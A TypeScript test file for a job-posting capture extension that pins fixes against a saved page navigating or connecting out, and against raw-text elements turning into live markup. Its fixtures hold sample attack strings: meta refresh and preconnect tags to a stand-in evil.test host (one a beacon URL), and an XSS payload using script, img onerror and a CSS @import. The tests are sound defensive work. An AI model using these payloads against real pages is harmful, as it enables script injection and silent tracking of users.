/**
 * The DOM walk's copy of the page is one the page cannot run code against.
 *
 * `serialise.js` used to copy the posting with `document.documentElement
 * .cloneNode(true)`. A clone made in the LIVE document is upgraded by the
 * page's custom element registry, so the page's constructors ran on it and its
 * `attributeChangedCallback`s fired on every attribute the walk wrote. Reproduced
 * in headless Chromium (round-2 review, R1): one element read the capture's
 * nonce off the first token written into its `style`, another prepended a
 * `<meta http-equiv=refresh>` and a `<link rel=preconnect>` to the clone's head
 * AFTER the strip pass, plus a forged token — and the downloaded file navigated
 * on open.
 *
 * There is no DOM in this suite (`environment: 'node'`), so the behaviour was
 * verified in Chromium and what is pinned here is the mechanism the fix rests
 * on, read out of the file the browser loads: the copy is made by `importNode`
 * into a document from `createHTMLDocument`, which has no browsing context and
 * so no custom element definitions; nothing in the walk builds elements in the
 * live document; and the returned string gets a last look for the two tags the
 * attack wrote. The string pass is EXECUTED: it is `lastLookAtString`, a helper
 * nested inside `serialise` (which is injected into the page whole, so nothing
 * in it can be exported), lifted out of the file by name.
 */
import { describe, expect, it } from 'vitest'
import serialiseSource from '../../extension/serialise.js?raw'
// @ts-expect-error — a plain ES module the extension loads from disk, untyped.
import { asFile } from '../../extension/save-file.js'
import { CAPTURE_STRIP_TAGS, remoteRefCount } from '@jojo/service/core/capture'

/** The file with its comments removed, so prose about `cloneNode` does not count. */
const code = serialiseSource.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/(^|[^:])\/\/[^\n]*/g, '$1')

describe('the copy the walk works on', () => {
  it('is imported into an inert document, never cloned inside the live one', () => {
    expect(code).not.toMatch(/\.cloneNode\(/)
    expect(code).toMatch(/document\.implementation\.createHTMLDocument\(/)
    expect(code).toMatch(/const doc = inert\.importNode\(document\.documentElement, true\)/)
  })

  it('builds every element it adds in that inert document', () => {
    expect(code).not.toMatch(/\bdocument\.createElement\(/)
    expect(code.match(/inert\.createElement\(/g)?.length).toBeGreaterThanOrEqual(3)
  })
})

/**
 * One nested pass, lifted out of the file by name. `serialise` is injected into
 * the page whole, so nothing inside it can be exported; `scope` names what the
 * pass closes over, handed in as arguments.
 */
function lift(name: string, ...scope: string[]): (...values: unknown[]) => unknown {
  const at = code.indexOf(`function ${name}(`)
  if (at === -1) throw new Error(`${name} is not in extension/serialise.js any more`)
  let depth = 0
  let end = -1
  for (let i = code.indexOf('{', at); i < code.length; i += 1) {
    if (code[i] === '{') depth += 1
    else if (code[i] === '}' && --depth === 0) {
      end = i + 1
      break
    }
  }
  if (end === -1) throw new Error(`could not find the end of ${name}`)
  // eslint-disable-next-line @typescript-eslint/no-implied-eval, no-new-func
  return new Function(...scope, `${code.slice(at, end)}; return ${name}`) as (...values: unknown[]) => unknown
}

describe('the last look at the returned string', () => {
  /** The pass, lifted from the file by name and run on a string. */
  const pass = lift('lastLookAtString')() as (input: string) => string

  it('is what the returned string is built from, not a helper beside it', () => {
    expect(code).toContain('const html = lastLookAtString(`<!doctype html>${doc.outerHTML}`)')
  })

  it('removes a refresh and a preconnect written after the strip ran, and keeps the rest', () => {
    const out = pass(
      '<html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=http://evil.test/b">' +
        '<meta name="viewport" content="width=device-width"><title>t</title>' +
        '<link rel="preconnect" href="http://evil.test:8942/"></head><body><p>posting</p></body></html>',
    )
    expect(out).not.toMatch(/refresh|preconnect|evil\.test/)
    expect(out).toContain('<meta charset="utf-8">')
    expect(out).toContain('<meta name="viewport" content="width=device-width">')
    expect(out).toContain('<p>posting</p>')
  })

  it('reads an attribute holding a `>` as the serialiser writes it', () => {
    const out = pass('<head><meta content="a > b" http-equiv="refresh"><title>t</title></head>')
    expect(out).toBe('<head><title>t</title></head>')
  })
})

/**
 * Round 3: `outerHTML` writes the text of a raw-text element literally, so a
 * page that built an `<xmp>` (or `noembed`, `noframes`, `plaintext`) with a
 * script and filled it with `</xmp><script>…<img onerror>…@import` had all of
 * that come out of the walk as live markup — reproduced in Chromium, and it
 * survived the worker's inlining. Verified fixed in Chromium with the same page;
 * pinned here is the pass, run against a stand-in for the inert document.
 */
describe('elements whose text the serialiser writes literally', () => {
  type Fake = {
    tagName: string
    textContent: string
    attributes: Record<string, string>
    replacedBy?: Fake
    setAttribute(name: string, value: string): void
    replaceWith(next: Fake): void
  }
  const element = (tagName: string, textContent = ''): Fake => ({
    tagName,
    textContent,
    attributes: {},
    setAttribute(name, value) {
      this.attributes[name] = value
    },
    replaceWith(next) {
      this.replacedBy = next
    },
  })

  it('become a <pre> of the same text, which is escaped when written out', () => {
    const payload = '</xmp><script>alert(1)</script><img src=x onerror=alert(1)><style>@import url(http://e.test/x.css)</style>'
    const found = ['XMP', 'NOEMBED', 'NOFRAMES', 'PLAINTEXT'].map((tag) => element(tag, payload))
    let selector = ''
    const doc = {
      querySelectorAll(query: string) {
        selector = query
        return found
      },
    }
    const inert = { createElement: (tag: string) => element(tag.toUpperCase()) }
    const escapeRawText = lift('escapeRawText', 'doc', 'inert')(doc, inert) as () => void
    escapeRawText()

    expect(selector.split(',').map((s) => s.trim()).sort()).toEqual(['noembed', 'noframes', 'plaintext', 'xmp'])
    for (const node of found) {
      expect(node.replacedBy?.tagName, node.tagName).toBe('PRE')
      expect(node.replacedBy?.textContent, node.tagName).toBe(payload)
    }
    // Hidden where browsers never showed the original.
    expect(found.map((node) => 'hidden' in (node.replacedBy?.attributes ?? {}))).toEqual([false, true, true, false])
  })

  it('leave no raw-text element unhandled between them and the strip list', () => {
    // The HTML serialiser's literal-text set. `style` is written back from the
    // CSSOM with `<` escaped (see `rulesOf`); the rest are stripped or escaped.
    const literal = ['style', 'script', 'xmp', 'iframe', 'noembed', 'noframes', 'plaintext', 'noscript']
    const stripped: readonly string[] = CAPTURE_STRIP_TAGS
    const escaped = /querySelectorAll\('([^']*)'\)\]\) \{\s*const pre/.exec(code)?.[1].split(',').map((s) => s.trim()) ?? []
    for (const tag of literal) {
      expect(tag === 'style' || stripped.includes(tag) || escaped.includes(tag), tag).toBe(true)
    }
  })

  it('are escaped before the string is written', () => {
    const walk = code.slice(code.lastIndexOf('readLiveTree()'))
    expect(walk.indexOf('escapeRawText()')).toBeGreaterThan(walk.indexOf('stripElements()'))
    expect(walk.indexOf('escapeRawText()')).toBeLessThan(walk.indexOf('lastLookAtString('))
  })
})

/**
 * The popup's Save path. The kept page goes straight to a file opened from
 * disk — no sandbox, no viewer — and the CSP it carries stops fetches but not a
 * `<meta http-equiv=refresh>` navigation or a `<link rel=preconnect>`. The kept
 * HTML below is what the pre-fix serialiser produced from the reproduction page.
 */
describe('a kept page written out as a file', () => {
  const KEPT_BEFORE_THE_FIX =
    '<!doctype html><html><head><meta http-equiv="refresh" content="0;url=http://evil.test:8941/beacon/SAVED_FILE_REFRESH"><title>Senior Engineer</title>\n' +
    '<style>a{color:red}</style>\n<link rel="preconnect" href="http://evil.test:8942/"></head><body><h1>Senior Engineer</h1></body></html>'

  const saved = (html: string) =>
    (asFile as (k: { url: string; capturedAt: string; html: string }) => string)({
      url: 'https://posting.test/jobs/1',
      capturedAt: '2026-11-13T00:00:00.000Z',
      html,
    })

  it('keeps no page-written <meta> or <link> that could navigate or connect', () => {
    const out = saved(KEPT_BEFORE_THE_FIX)
    // Only the three tags the file writes itself remain as <meta>.
    expect(out.match(/<meta\b/gi)).toHaveLength(3)
    expect(out).not.toMatch(/<link\b/i)
    expect(remoteRefCount(out.replace(/<basefont\b[^>]*>/gi, ''))).toBe(0)
    expect(out).toContain('<h1>Senior Engineer</h1>')
  })

  it('neutralises every spelling of the two tags the parser would read', () => {
    for (const tag of ['<META http-equiv=refresh content=0;url=http://e/>', '<meta\thttp-equiv="refresh">', '<link/rel=preconnect href=http://e/>', '<LINK\nrel=dns-prefetch href=//e>']) {
      const out = saved(`<!doctype html><head>${tag}</head>`)
      expect(out.slice(out.indexOf('-->')).match(/<meta\b/gi), tag).toHaveLength(3)
      expect(out, tag).not.toMatch(/<link\b/i)
    }
  })

  it('opens with its own head whatever precedes the page’s doctype', () => {
    for (const lead of ['﻿', ' ', ' ', '<!-->', '<!-- a --!>']) {
      const out = saved(`${lead}<!doctype html><img src="http://evil.test/b">`)
      expect(out.indexOf('http-equiv="Content-Security-Policy"'), JSON.stringify(lead)).toBeLessThan(out.indexOf(lead === '﻿' ? '<img' : lead))
      expect(out.startsWith('<!doctype html>\n<!-- Saved by the jojo extension')).toBe(true)
    }
  })
})
